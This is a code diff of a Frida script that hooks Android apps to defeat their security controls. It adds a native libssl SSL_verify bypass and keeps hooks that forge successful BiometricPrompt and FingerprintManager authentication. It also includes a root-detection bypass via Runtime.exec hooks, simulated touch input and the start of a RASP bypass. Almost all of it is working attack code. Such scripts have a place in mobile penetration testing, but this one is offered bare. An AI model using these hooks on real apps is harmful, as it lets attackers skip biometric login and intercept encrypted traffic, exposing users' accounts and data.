@@ -69,6 +69,7 @@ Java.perform(function () {
         }
     };
 
+    // Command hooks for root detection bypass
     var exec = Runtime.exec.overload('[Ljava.lang.String;');
     var exec1 = Runtime.exec.overload('java.lang.String');
     var exec2 = Runtime.exec.overload('java.lang.String', '[Ljava.lang.String;');
@@ -216,7 +217,25 @@ Java.perform(function () {
         send('SSL Pinning Bypass failed, proceeding with other checks.');
     }
 
-    // Biometric Authentication Bypass Enhancement
+    // **SSL_verify Bypass**
+    // Try hooking into native SSL pinning method if available
+    try {
+        var SSL_verify = Module.findExportByName("libssl.so", "SSL_verify");
+        if (SSL_verify) {
+            Interceptor.attach(SSL_verify, {
+                onEnter: function (args) {
+                    send("Bypassing SSL verification (libssl.so)");
+                    args[0] = 0; // Modify the argument to bypass SSL checks
+                }
+            });
+        } else {
+            send("SSL_verify function not found, proceeding without native SSL bypass.");
+        }
+    } catch (err) {
+        send("Error attempting to hook SSL_verify: " + err);
+    }
+
+    // Biometric Authentication Bypass
     var callbackG = null;
     var authenticationResultInst = null;
 
@@ -225,27 +244,21 @@ Java.perform(function () {
         var CryptoObject = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
         var AuthenticationResult = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
 
-        // Hook authenticate method with CancellationSignal
         BiometricPrompt.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function (cancelSignal, executor, callback) {
             send('Bypassing BiometricPrompt.authenticate() with CancellationSignal');
 
-            // Create a fake CryptoObject and AuthenticationResult
             var cryptoObj = CryptoObject.$new(null);
             authenticationResultInst = AuthenticationResult.$new(cryptoObj, null, 0);
 
-            // Retain callback to prevent garbage collection
             callbackG = callback;
             Java.retain(callback);
 
-            // Trigger successful authentication
             callback.onAuthenticationSucceeded(authenticationResultInst);
         };
 
-        // Hook authenticate method with CryptoObject
         BiometricPrompt.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function (cryptoObj, cancelSignal, executor, callback) {
             send('Bypassing BiometricPrompt.authenticate() with CryptoObject');
 
-            // Retain callback and trigger successful authentication
             authenticationResultInst = AuthenticationResult.$new(cryptoObj, null, 0);
             callbackG = callback;
             Java.retain(callback);
@@ -268,12 +281,10 @@ Java.perform(function () {
         ).implementation = function (cryptoObject, cancel, flags, callback, handler) {
             send('Bypassing FingerprintManager.authenticate()');
 
-            // Create fake AuthenticationResult
             authenticationResultInst = AuthenticationResult.$new(cryptoObject, null, 0);
             callbackG = callback;
             Java.retain(callback);
 
-            // Trigger successful authentication
             callback.onAuthenticationSucceeded(authenticationResultInst);
         };
     });
@@ -286,7 +297,6 @@ Java.perform(function () {
             var downTime = SystemClock.uptimeMillis();
             var eventTime = downTime + 50; // Assuming finger stays for 50 ms
 
-            // Choose the correct overload dynamically
             var touchEventDown = MotionEvent.obtain.overload('long', 'long', 'int', 'float', 'float', 'int').call(
                 MotionEvent, downTime, eventTime, MotionEvent.ACTION_DOWN.value, 50.0, 50.0, 0
             );
@@ -294,7 +304,6 @@ Java.perform(function () {
                 MotionEvent, downTime + 50, eventTime + 100, MotionEvent.ACTION_UP.value, 50.0, 50.0, 0
             );
 
-            // Attempt to dispatch events
             var View = Java.use('android.view.View');
             var rootView = Java.cast(View.getRootView(), View);
             rootView.dispatchTouchEvent(touchEventDown);
@@ -306,7 +315,6 @@ Java.perform(function () {
         }
     }
 
-    // Optional: Call this function when needed
     simulateUserInteraction();
 
     // RASP (Runtime Application Self-Protection) Bypass
